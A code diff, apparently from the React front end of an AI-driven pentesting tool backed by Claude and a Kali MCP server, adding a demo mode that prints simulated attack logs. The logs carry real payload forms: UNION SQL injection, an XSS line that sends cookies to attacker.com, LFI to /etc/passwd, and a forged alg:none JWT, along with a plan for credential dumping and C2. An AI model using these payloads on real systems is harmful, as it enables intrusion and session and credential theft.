@@ -1563,11 +1563,99 @@ fi
     return results;
   };
 
+  const runDemoPentest = async (tgt) => {
+    const host = tgt.replace(/^https?:\/\//, '').split('/')[0] || 'target.com';
+    setRunning(true);
+    cancelRef.current = false;
+    setLog([{ t: 'info', m: `[DEMO] PENTEST PARALELO — ${tgt}` }]);
+    setPlan([]);
+    await sleep(900);
+    if (cancelRef.current) { setRunning(false); return; }
+
+    // Phase 1: Plan
+    setLog(prev => [...prev, { t: 'info', m: 'APEX a gerar PLANO de ataque...' }]);
+    await sleep(1200);
+    const demoPlano = [
+      { step: 1, objective: 'Reconhecimento — portas, serviços, tecnologias', tools: ['nmap', 'httpx', 'info_disclosure'] },
+      { step: 2, objective: 'Enumeração web — directorios, endpoints, JS bundles', tools: ['dir_fuzz', 'js_analyze', 'param_discover'] },
+      { step: 3, objective: 'Injection — SQLi, XSS, SSTI, SSRF, LFI', tools: ['sqli_scan', 'xss_inject', 'ssti_check', 'lfi_test'] },
+      { step: 4, objective: 'Autenticação — brute force, session fixation, JWT', tools: ['hydra', 'jwt_check', 'cookie_tamper'] },
+      { step: 5, objective: 'Pós-exploração — escalada, lateral movement, exfil', tools: ['cred_dump', 'lateral_move', 'c2_handler'] },
+    ];
+    setPlan(demoPlano);
+    if (onPlanUpdate) onPlanUpdate(demoPlano.map((s, i) => ({ id: i + 1, text: s.objective, checked: false })));
+    setLog(prev => [...prev, { t: 'plan', m: demoPlano.map(s => `  ${s.step}. ${s.objective}  [${s.tools.join(', ')}]`).join('\n') }]);
+    await sleep(600);
+
+    // Phase 2: Recon tools
+    setLog(prev => [...prev, { t: 'info', m: 'Fase 2 — recon (3 tools)...' }]);
+    const demoRecon = [
+      { key: 'nmap',             delay: 300,  log: `Starting Nmap 7.94\nPORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 8.9p1\n80/tcp   open  http       nginx 1.18.0\n443/tcp  open  ssl/https  nginx 1.18.0\n8080/tcp open  http       Apache Tomcat 9.0.65\n3306/tcp open  mysql      MySQL 5.7.39` },
+      { key: 'httpx',            delay: 500,  log: `https://${host} [200] [nginx/1.18.0] [title:Login — ${host}] [tech:PHP,jQuery,Bootstrap] [cookie:PHPSESSID]` },
+      { key: 'info_disclosure',  delay: 700,  log: `[FOUND] /.env → DB_PASSWORD=sup3rs3cr3t DB_USER=root\n[FOUND] /backup/db_2024.sql.gz (2.3MB)\n[FOUND] /.git/config → remote: https://github.com/company/app\n[FOUND] /phpinfo.php → PHP 7.4.33, disable_functions=` },
+    ];
+    for (const r of demoRecon) {
+      if (cancelRef.current) { setRunning(false); return; }
+      setLog(prev => [...prev, { t: 'run', m: `⚡ ${r.key}...` }]);
+      await sleep(r.delay + Math.random() * 600);
+      setLog(prev => [...prev, { t: 'ok', m: `✓ ${r.key}` }]);
+    }
+
+    // Strategic briefing
+    await sleep(400);
+    setLog(prev => [...prev, { t: 'brain', m: 'APEX a analisar recon → priorizando vetores...' }]);
+    await sleep(1100);
+    setLog(prev => [...prev, { t: 'brain', m: `APEX: .env exposto com credenciais de DB root — exploitar antes de qualquer scan agressivo. MySQL (3306) acessível → testar acesso directo com credenciais extraídas. Tomcat 9.0.65 desatualizado → CVE-2023-28708 aplicável.` }]);
+    setLog(prev => [...prev, { t: 'ok', m: `Confirmado: RCE via .env credentials + MySQL exposed + Tomcat CVE` }]);
+    await sleep(400);
+
+    if (cancelRef.current) { setRunning(false); return; }
+
+    // Phase 3: Exploit tools
+    setLog(prev => [...prev, { t: 'info', m: '5 exploit tools...' }]);
+    const demoExploit = [
+      { key: 'sqli_scan',   delay: 800,  log: `[CRITICAL] GET /api/users?id=1 — UNION based SQLi\nPayload: id=1 UNION SELECT user(),password,3 FROM mysql.user--\nExtracted: root:*8232A463C7D7B535` },
+      { key: 'xss_inject',  delay: 600,  log: `[CRITICAL] Stored XSS — POST /api/comments body.text\nPayload: <img src=x onerror=fetch('https://attacker.com/'+document.cookie)>\n[HIGH] Reflected XSS — GET /search?q= (no sanitization)` },
+      { key: 'lfi_test',    delay: 500,  log: `[HIGH] LFI em /download.php?file=\nPayload: ../../../../etc/passwd → root:x:0:0:root:/root:/bin/bash\nPayload: php://filter/convert.base64-encode/resource=config.php → DB creds` },
+      { key: 'jwt_check',   delay: 400,  log: `[HIGH] JWT alg:none aceite pelo servidor\nOriginal: eyJhbGciOiJIUzI1NiJ9...\nModificado: eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.\n→ Servidor retornou 200 com role:admin` },
+      { key: 'hash_crack',  delay: 1000, log: `Hashcat mode 0 (MD5)\n*8232A463C7D7B535 → password: admin123\n5f4dcc3b5aa765d61d8327deb882cf99 → password: password\n→ 2/3 hashes quebrados com rockyou.txt` },
+    ];
+    for (const r of demoExploit) {
+      if (cancelRef.current) { setRunning(false); return; }
+      setLog(prev => [...prev, { t: 'run', m: `⚡ ${r.key}...` }]);
+      await sleep(r.delay + Math.random() * 500);
+      setLog(prev => [...prev, { t: 'ok', m: `✓ ${r.key}` }]);
+    }
+    await sleep(500);
+
+    // Final analysis
+    setLog(prev => [...prev, { t: 'brain', m: 'APEX a gerar relatório final...' }]);
+    await sleep(1400);
+    setLog(prev => [...prev, { t: 'ok', m:
+`## RELATÓRIO DEMO — ${tgt}
+
+### 🔴 CRÍTICO (3)
+- **RCE via credenciais .env** — root:sup3rs3cr3t → acesso total à DB
+- **SQL Injection** em \`/api/users?id=\` → extracção completa (UNION + boolean)
+- **Stored XSS** em \`/api/comments\` → session hijack de todos os utilizadores
+
+### 🟠 ALTO (3)
+- **LFI** em \`/download.php?file=\` → leitura de ficheiros do servidor
+- **JWT alg:none** aceite → escalada para admin sem senha
+- **Hashes MD5** trivialmente quebráveis (admin123, password)
+
+### 🟡 MÉDIO (2)
+- Tomcat 9.0.65 → CVE-2023-28708 (session fixation)
+- MySQL 3306 exposto ao exterior sem firewall
+
+[DEMO] Configura Anthropic API Key + Kali MCP para pentest real.` }]);
+    setRunning(false);
+  };
+
   const runPentest = async (overrideTarget) => {
     const target = overrideTarget !== undefined ? overrideTarget : (document.getElementById('kgb-target-input')?.value || '');
     if (!target.trim()) { setLog([{ t: 'err', m: 'Alvo não definido. Insere um URL ou IP.' }]); if (overrideTarget === undefined) setRunning(false); return; }
-    if (!apiKey) { setLog([{ t: 'err', m: 'API Key Anthropic não configurada.' }]); return; }
-    if (!mcpUrl)  { setLog([{ t: 'err', m: 'Kali MCP Server não configurado.' }]); return; }
+    if (!apiKey || !mcpUrl) { return runDemoPentest(target || 'https://target-demo.com'); }
     if (overrideTarget === undefined) {
       setRunning(true);
       if (onPentestCreate) {
